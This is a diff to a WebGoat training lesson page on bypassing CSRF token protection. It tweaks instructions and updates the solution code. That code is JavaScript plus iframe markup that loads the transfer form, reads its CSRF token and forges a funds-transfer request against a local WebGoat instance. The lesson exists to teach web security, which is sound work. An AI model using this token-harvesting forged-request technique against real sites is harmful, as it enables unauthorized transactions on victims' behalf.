@@ -32,7 +32,8 @@ request to transfer funds.  To successfully complete you need to obtain a valid 
 URL that presents the transfer funds form is the same as the CSRF lesson with an extra parameter 
 "transferFunds=main".  Load this page, read the token and append the token in a forged request 
 to transferFunds. When you think the attack is successful, refresh the page and you will find the 
-green check on the left hand side menu.
+green check on the left hand side menu.<br/>
+<b>Note that the "Screen" and "menu" GET variables will vary between WebGoat builds. Copying the menu link on the left will give you the current values.</b>
 </p>
 
 <b>Solution:</b><br/>
@@ -70,7 +71,7 @@ var tokenvalue;
 function readFrame1()
 {
     var frameDoc = document.getElementById("frame1").contentDocument;
-    var form = frameDoc.getElementsByTagName("Form")[0];
+    var form = frameDoc.getElementsByTagName("form")[1];
     var token = form.CSRFToken.value;
     tokenvalue = '&CSRFToken='+token;
     
@@ -80,7 +81,7 @@ function readFrame1()
 function loadFrame2()
 {
     var testFrame = document.getElementById("frame2");
-    testFrame.src="http://localhost:8080/WebGoat/attack?Screen=212&menu=900&transferFunds=4000"+tokenvalue;	
+    testFrame.src="http://localhost:8080/webgoat/attack?Screen=212&menu=900&transferFunds=4000"+tokenvalue;	
 }
 </pre></code>
 
@@ -94,7 +95,7 @@ call readFrame1, which calls loadFrame2, which then sets the src for the second 
 
 
 <code>
-<pre id="line585">&lt;<span class="start-tag">iframe</span><span class="attribute-name">	src</span>=<span class="attribute-value">"http://localhost:8080/WebGoat/attack?Screen=212&amp;menu=900&amp;transferFunds=main"
+<pre id="line585">&lt;<span class="start-tag">iframe</span><span class="attribute-name">	src</span>=<span class="attribute-value">"http://localhost:8080/webgoat/attack?Screen=212&amp;menu=900&amp;transferFunds=main"
 	</span><span class="attribute-name">onload</span>=<span class="attribute-value">"readFrame1();"
 	</span><span class="attribute-name">id</span>=<span class="attribute-value">"frame1" </span><span class="attribute-name">frameborder</span>=<span class="attribute-value">"1" </span><span class="attribute-name">marginwidth</span>=<span class="attribute-value">"0"
 	</span><span class="attribute-name">marginheight</span>=<span class="attribute-value">"0" </span><span class="attribute-name">width</span>=<span class="attribute-value">"800" </span><span class="attribute-name">scrolling</span>=<span class="attribute-value">yes </span><span class="attribute-name">height</span>=<span class="attribute-value">"300"</span>&gt;&lt;/<span class="end-tag">iframe</span>&gt;
